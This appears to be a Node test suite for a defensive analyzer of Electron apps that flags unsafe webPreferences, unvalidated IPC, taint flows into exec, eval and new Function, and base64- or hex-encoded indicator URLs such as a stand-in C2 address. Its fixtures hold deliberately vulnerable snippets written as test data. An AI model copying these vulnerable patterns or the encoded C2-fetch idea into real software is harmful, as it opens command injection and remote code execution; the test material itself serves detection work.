import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import * as asar from "@electron/asar";
import { parseEvidence, sha256Hex } from "@rtk/evidence";
import { analyzeJavaScriptApplication, compareJavaScriptApplications } from "../src/index.ts";

const here = dirname(fileURLToPath(import.meta.url));
const V1 = join(here, "fixtures/jsapp"), V2 = join(here, "fixtures/jsapp2");
const nr = (e: { normalized_result: unknown }): any => e.normalized_result;

function tmpApp(files: Record<string, string>): { dir: string; done: () => void } {
  const dir = mkdtempSync(join(tmpdir(), "rtk-js-test-"));
  for (const [p, c] of Object.entries(files)) { mkdirSync(dirname(join(dir, p)), { recursive: true }); writeFileSync(join(dir, p), c); }
  return { dir, done: () => rmSync(dir, { recursive: true, force: true }) };
}

test("evidence envelope: provider, operation, authenticated id, subject digest", async () => {
  const e = await analyzeJavaScriptApplication(V1);
  assert.equal(e.operation, "analyze_javascript_application");
  assert.equal(e.provider.id, "rtk-js-analyzer");
  assert.equal(e.authority, "shipped-artifact");
  assert.match(e.subject!.digest.sha256, /^[a-f0-9]{64}$/);
  assert.ok(e.limitations.length > 0);
  parseEvidence(JSON.parse(JSON.stringify(e))); // id matches content
  const again = await analyzeJavaScriptApplication(V1);
  assert.equal(again.evidence_id, e.evidence_id, "deterministic");
});

test("v1 vs v2 webPreferences", async () => {
  const w1 = nr(await analyzeJavaScriptApplication(V1)).electron.windows;
  const w2 = nr(await analyzeJavaScriptApplication(V2)).electron.windows;
  assert.equal(w1.length, 1); assert.equal(w2.length, 1);
  assert.equal(w1[0].webPreferences.nodeIntegration, true);
  assert.equal(w1[0].webPreferences.contextIsolation, "unset");
  assert.equal(w2[0].webPreferences.nodeIntegration, false);
  assert.equal(w2[0].webPreferences.contextIsolation, true);
  assert.equal(w2[0].webPreferences.sandbox, true);
  assert.equal(w1[0].preload.resolved_file, "src/preload.js");
  assert.equal(nr(await analyzeJavaScriptApplication(V1)).electron.main_entry.resolved, "src/main.js");
});

test("sender validation for run-task: false in v1, true in v2", async () => {
  const find = (e: any) => nr(e).electron.ipc.find((i: any) => i.side === "main" && i.channel === "run-task");
  const h1 = find(await analyzeJavaScriptApplication(V1)), h2 = find(await analyzeJavaScriptApplication(V2));
  assert.equal(h1.kind, "handle"); assert.equal(h1.channel_kind, "literal");
  assert.equal(h1.sender_validation, false);
  assert.equal(h2.sender_validation, true);
});

test("v1 flows: ipc-argument -> exec, network-response -> eval; base64 literal decoded IOC", async () => {
  const n = nr(await analyzeJavaScriptApplication(V1));
  const exec = n.sinks.find((s: any) => s.kind === "child-process");
  assert.equal(exec.api, "child_process.exec");
  assert.equal(exec.taint.source, "ipc-argument"); assert.equal(exec.taint.channel, "run-task");
  assert.equal(exec.argument.kind, "identifier"); assert.equal(exec.argument.value, "cmd");
  const ev = n.sinks.find((s: any) => s.kind === "eval");
  assert.equal(ev.taint.source, "network-response");
  assert.ok(ev.taint.path.some((p: string) => p === "var:d"));
  assert.equal(n.flows.filter((f: any) => !f.guarded).length, 2);
  const b64 = n.sinks.find((s: any) => s.kind === "base64-decode");
  assert.equal(b64.decoded_preview, "https://c2.example.invalid/task");
  const ioc = n.iocs.find((i: any) => i.value === "https://c2.example.invalid/task");
  assert.deepEqual(ioc.encoding, ["base64"]);
  assert.equal(ioc.file, "src/config.js"); assert.equal(ioc.loc.line, 1);
  const net = n.sinks.find((s: any) => s.kind === "network-request");
  assert.equal(net.argument.kind, "dynamic"); // cfg.url is not statically resolvable and is not guessed
  assert.ok(n.sinks.some((s: any) => s.kind === "timer"));
});

test("v2: exec flow is guarded by allowlist; eval flow remains", async () => {
  const n = nr(await analyzeJavaScriptApplication(V2));
  const cp = n.sinks.find((s: any) => s.kind === "child-process");
  assert.equal(cp.api, "child_process.execFileSync");
  assert.equal(cp.taint.source, "ipc-argument"); assert.equal(cp.taint.guarded, true);
  assert.match(cp.taint.guard, /^allowlist-membership/);
  assert.ok(n.flows.some((f: any) => f.sink_kind === "eval" && !f.guarded));
});

test("compare(v1, v2) reports the security delta", async () => {
  const a = await analyzeJavaScriptApplication(V1), b = await analyzeJavaScriptApplication(V2);
  const d = compareJavaScriptApplications(a, b);
  assert.equal(d.operation, "compare_javascript_applications");
  parseEvidence(JSON.parse(JSON.stringify(d)));
  const items: any[] = nr(d).items;
  const st = (id: string) => items.find((i) => i.id === id)?.status;
  assert.equal(st("window:src/main.js#1:webPreferences.nodeIntegration"), "improved");
  assert.equal(st("window:src/main.js#1:webPreferences.contextIsolation"), "improved");
  assert.equal(items.find((i) => i.id === "window:src/main.js#1:webPreferences.sandbox").status, "improved");
  assert.equal(st("ipc:run-task:sender_validation"), "improved");
  assert.equal(items.find((i) => i.category === "taint-flow" && i.note.includes("child_process")).status, "improved");
  assert.equal(items.filter((i) => i.status === "regressed").length, 0);
  assert.ok(nr(d).summary.improved >= 4);
  // reverse direction regresses
  const r = nr(compareJavaScriptApplications(b, a)).items;
  assert.equal(r.find((i: any) => i.id === "ipc:run-task:sender_validation").status, "regressed");
  assert.equal(r.find((i: any) => i.id === "window:src/main.js#1:webPreferences.nodeIntegration").status, "regressed");
  // identical -> empty delta
  assert.equal(nr(compareJavaScriptApplications(a, a)).summary.total, 0);
  assert.throws(() => compareJavaScriptApplications(d, a), /not an analyze_javascript_application/);
});

test("cross-check with REA output (reduced fixture of T1-js-v1.json)", async () => {
  const rea = JSON.parse(readFileSync(join(here, "fixtures/rea-T1-js-v1.reduced.json"), "utf8"));
  const n = nr(await analyzeJavaScriptApplication(V1));
  assert.equal(n.summary.browser_windows, rea.summary.browser_windows);
  assert.equal(n.electron.windows.length, 1);
  assert.equal(n.summary.context_bridge_apis, rea.summary.context_bridge_apis);
  assert.deepEqual(n.electron.context_bridge[0].members, rea.context_bridge_apis[0].members);
  assert.equal(n.electron.context_bridge[0].api, rea.context_bridge_apis[0].api_key);
  const reaChan = rea.ipc_channels.filter((c: any) => c.side === "main").map((c: any) => c.channel);
  assert.deepEqual(reaChan, ["run-task"]);
  assert.equal(n.summary.ipc.literal_channels > 0, true);
  assert.deepEqual([...new Set(n.electron.ipc.map((i: any) => i.channel))], reaChan);
  assert.equal(n.summary.ipc.main_handlers, rea.summary.ipc.main_handlers);
  // REA's window webPreferences: nodeIntegration literal true, preload literal "preload.js"
  const rw = rea.browser_windows[0].web_preferences;
  const ni = rw.find((p: any) => p.name === "nodeIntegration").value;
  assert.equal(ni.status, "literal"); assert.equal(ni.value, n.electron.windows[0].webPreferences.nodeIntegration);
  assert.equal(rea.browser_windows[0].preload_path, n.electron.preloads[0].value);
  // gaps REA leaves open that this analyzer fills: exec/eval/base64 classified
  assert.ok(n.sinks.some((s: any) => s.kind === "child-process") && n.sinks.some((s: any) => s.kind === "eval") && n.sinks.some((s: any) => s.kind === "base64-decode"));
});

test("modules: imports with resolution status", async () => {
  const n = nr(await analyzeJavaScriptApplication(V1));
  const main = n.modules.find((m: any) => m.path === "src/main.js").imports;
  const by = (s: string) => main.find((i: any) => i.specifier === s);
  assert.equal(by("electron").status, "electron");
  assert.equal(by("child_process").status, "builtin");
  assert.equal(by("./config").status, "resolved"); assert.equal(by("./config").resolved, "src/config.js");
  assert.equal(by("./config").form, "require");
});

test("ASAR input", async () => {
  const t = tmpApp({});
  await asar.createPackage(V1, join(t.dir, "app.asar"));
  const e = await analyzeJavaScriptApplication(join(t.dir, "app.asar"));
  const n = nr(e);
  assert.equal(n.input.format, "asar");
  assert.equal(e.subject!.format, "asar");
  assert.equal(e.subject!.digest.sha256, sha256Hex(readFileSync(join(t.dir, "app.asar"))));
  assert.equal(n.electron.windows[0].webPreferences.nodeIntegration, true);
  assert.ok(n.sinks.some((s: any) => s.kind === "eval"));
  assert.ok(n.iocs.some((i: any) => i.value === "https://c2.example.invalid/task"));
  assert.ok(e.limitations.some((l) => l.includes(".asar")));
  assert.equal(readdirSync(tmpdir()).filter((x) => x.startsWith("rtk-js-asar-")).length, 0, "temp extraction removed");
  t.done();
});

test("single file input", async () => {
  const e = await analyzeJavaScriptApplication(join(V1, "src/net.js"));
  assert.equal(nr(e).input.format, "file");
  assert.ok(nr(e).sinks.some((s: any) => s.kind === "eval" && s.taint));
});

test("parse failure and non-JS files are reported, not fatal", async () => {
  const t = tmpApp({ "bad.js": "function ( {", "ok.js": "eval(location.hash)", "data.json": "{oops", "logo.png": "\x89PNG", "readme.md": "# hi", "addon.node": "ELF", "ts.ts": "const a: number = 1;" });
  try {
    const e = await analyzeJavaScriptApplication(t.dir);
    const f = (p: string) => nr(e).files.find((x: any) => x.path === p);
    assert.equal(f("bad.js").parse_status, "parse-error"); assert.ok(f("bad.js").parse_error); assert.ok(f("bad.js").parse_error_loc.line >= 1);
    assert.equal(f("ok.js").parse_status, "ok");
    assert.equal(f("data.json").parse_status, "json-error");
    assert.equal(f("logo.png").parse_status, "skipped-non-js");
    assert.equal(f("ts.ts").parse_status, "skipped-non-js");
    assert.equal(f("addon.node").parse_status, "native-binary-not-analysed");
    assert.ok(f("logo.png").sha256); // hashed anyway
    assert.equal(nr(e).summary.parse_errors, 2);
    assert.ok(nr(e).sinks.some((s: any) => s.kind === "eval" && s.file === "ok.js"));
  } finally { t.done(); }
});

test("size limits, time budget and depth limit are explicit limitations", async () => {
  const big = "var x = 1;\n".repeat(2000);
  const nested = "x = " + "[".repeat(300) + "1" + "]".repeat(300) + ";";
  const t = tmpApp({ "big.js": big, "small.js": "eval(1)", "deep.js": nested });
  try {
    const e1 = await analyzeJavaScriptApplication(t.dir, { maxFileBytes: 1000 });
    assert.equal(nr(e1).files.find((f: any) => f.path === "big.js").parse_status, "skipped-too-large");
    assert.ok(nr(e1).files.find((f: any) => f.path === "big.js").sha256, "oversized file still hashed");
    assert.ok(e1.limitations.some((l) => l.includes("big.js") && l.includes("maxFileBytes")));
    const e2 = await analyzeJavaScriptApplication(t.dir, { timeBudgetMs: -1 });
    assert.ok(nr(e2).files.every((f: any) => f.kind !== "javascript" || f.parse_status === "skipped-time-budget"));
    assert.ok(e2.limitations.some((l) => l.includes("time budget")));
    const e3 = await analyzeJavaScriptApplication(t.dir, { maxAstDepth: 50 });
    assert.equal(nr(e3).files.find((f: any) => f.path === "deep.js").parse_status, "partial-depth-limit");
    assert.ok(e3.limitations.some((l) => l.includes("AST depth")));
    const e4 = await analyzeJavaScriptApplication(t.dir, { maxFiles: 1 });
    assert.ok(e4.limitations.some((l) => l.includes("file count limit")));
  } finally { t.done(); }
});

test("unresolved dynamic constructs are 'dynamic', not guessed", async () => {
  const t = tmpApp({
    "package.json": JSON.stringify({ main: "main.js" }),
    "main.js": `
const { app, BrowserWindow, ipcMain } = require('electron');
const name = process.argv[2];
const opts = makeOpts();
const flag = process.env.FLAG === '1';
new BrowserWindow(opts);
new BrowserWindow({ webPreferences: { nodeIntegration: flag, ...extra } });
ipcMain.on(name, (e, a) => {});
const m = require(name);
require('./missing');
const f = new Function(name);
`,
  });
  try {
    const n = nr(await analyzeJavaScriptApplication(t.dir));
    const [w1, w2] = n.electron.windows;
    assert.equal(w1.options_status, "dynamic"); assert.equal(w1.webPreferences.nodeIntegration, "dynamic"); assert.equal(w1.webPreferences.sandbox, "dynamic");
    assert.equal(w2.webPreferences.nodeIntegration, "dynamic"); assert.equal(w2.webPreferences.contextIsolation, "dynamic"); // spread may set anything
    const ch = n.electron.ipc[0];
    assert.equal(ch.channel, "dynamic"); assert.equal(ch.channel_kind, "dynamic");
    assert.ok(n.sinks.some((s: any) => s.kind === "dynamic-require" && s.argument.kind === "identifier"));
    assert.ok(n.sinks.some((s: any) => s.kind === "function-constructor"));
    const mods = n.modules[0].imports;
    assert.ok(mods.some((i: any) => i.specifier === "./missing" && i.status === "unresolved"));
    assert.ok(n.electron.ipc[0].sender_validation === false);
  } finally { t.done(); }
});

test("sender validation heuristics: read-only is not validation; helper and destructuring count", async () => {
  const t = tmpApp({
    "main.js": `
const { ipcMain } = require('electron');
ipcMain.handle('a', (e) => { console.log(e.senderFrame.url); return 1; });
ipcMain.handle('b', (e) => { const u = e.senderFrame.url; if (u !== 'app://main') throw new Error('x'); });
function check(ev) { return new URL(ev.senderFrame.url).origin === 'app://main'; }
ipcMain.handle('c', (e, x) => { if (!check(e)) throw new Error('no'); });
ipcMain.on('d', ({ senderFrame }, x) => { if (!senderFrame.url.startsWith('app://')) return; });
function h(e) { return e.sender.getURL() === 'x'; }
ipcMain.handle('e', h);
`,
  });
  try {
    const ipc = nr(await analyzeJavaScriptApplication(t.dir)).electron.ipc;
    const sv = Object.fromEntries(ipc.map((i: any) => [i.channel, i.sender_validation]));
    assert.deepEqual(sv, { a: false, b: true, c: true, d: true, e: true });
  } finally { t.done(); }
});

test("taint: env, fs-read, fetch chains, weak checks do not count as guards", async () => {
  const t = tmpApp({
    "a.js": `
const { exec, spawn } = require('child_process');
const fs = require('fs');
const vm = require('vm');
exec(process.env.CMD);
const data = fs.readFileSync('/etc/x', 'utf8');
vm.runInThisContext(data);
fetch('https://x.example.invalid/p').then(r => r.text()).then(t => new Function(t)());
const { ipcMain } = require('electron');
ipcMain.handle('w', (e, c) => { if (!c.startsWith('ls')) throw 1; spawn(c); });
setTimeout('alert(1)', 5);
`,
  });
  try {
    const n = nr(await analyzeJavaScriptApplication(t.dir));
    const by = (k: string, src: string) => n.sinks.find((s: any) => s.kind === k && s.taint?.source === src);
    assert.ok(by("child-process", "env")); assert.ok(by("vm", "fs-read")); assert.ok(by("function-constructor", "network-response"));
    const sp = n.sinks.find((s: any) => s.api === "child_process.spawn");
    assert.equal(sp.taint.source, "ipc-argument"); assert.equal(sp.taint.guarded, undefined, "startsWith is a weak check, not a guard");
    const timer = n.sinks.find((s: any) => s.kind === "timer" && s.argument.kind === "literal");
    assert.equal(timer.argument.value, "alert(1)");
    assert.ok(n.sinks.some((s: any) => s.kind === "network-request" && s.api === "fetch" && s.argument.kind === "literal"));
    assert.ok(n.iocs.some((i: any) => i.value === "https://x.example.invalid/p"));
  } finally { t.done(); }
});

test("IOCs: hex layer, double base64, IPs with location", async () => {
  const hex = Buffer.from("http://10.1.2.3:8080/x").toString("hex");
  const dbl = Buffer.from(Buffer.from("https://deep.example.invalid/z").toString("base64")).toString("base64");
  const t = tmpApp({ "a.js": `const a = '${hex}';\nconst b = '${dbl}';\nconst c = 'connect to 192.0.2.7 now';\nconst d = '999.1.1.1';` });
  try {
    const iocs = nr(await analyzeJavaScriptApplication(t.dir)).iocs;
    const get = (v: string) => iocs.find((i: any) => i.value === v);
    assert.deepEqual(get("http://10.1.2.3:8080/x").encoding, ["hex"]); assert.equal(get("http://10.1.2.3:8080/x").loc.line, 1);
    assert.deepEqual(get("https://deep.example.invalid/z").encoding, ["base64", "base64"]); assert.equal(get("https://deep.example.invalid/z").loc.line, 2);
    assert.equal(get("192.0.2.7").kind, "ip"); assert.equal(get("192.0.2.7").loc.line, 3);
    assert.equal(get("999.1.1.1"), undefined);
  } finally { t.done(); }
});

test("CLI: analyze and compare print JSON Evidence", () => {
  const bin = join(here, "../bin/rtk-js.ts");
  const a = spawnSync(process.execPath, [bin, "analyze", V1], { encoding: "utf8" });
  assert.equal(a.status, 0, a.stderr);
  assert.equal(JSON.parse(a.stdout).operation, "analyze_javascript_application");
  const c = spawnSync(process.execPath, [bin, "compare", V1, V2], { encoding: "utf8" });
  assert.equal(c.status, 0, c.stderr);
  assert.ok(JSON.parse(c.stdout).normalized_result.summary.improved >= 4);
  assert.equal(spawnSync(process.execPath, [bin], { encoding: "utf8" }).status, 2);
});
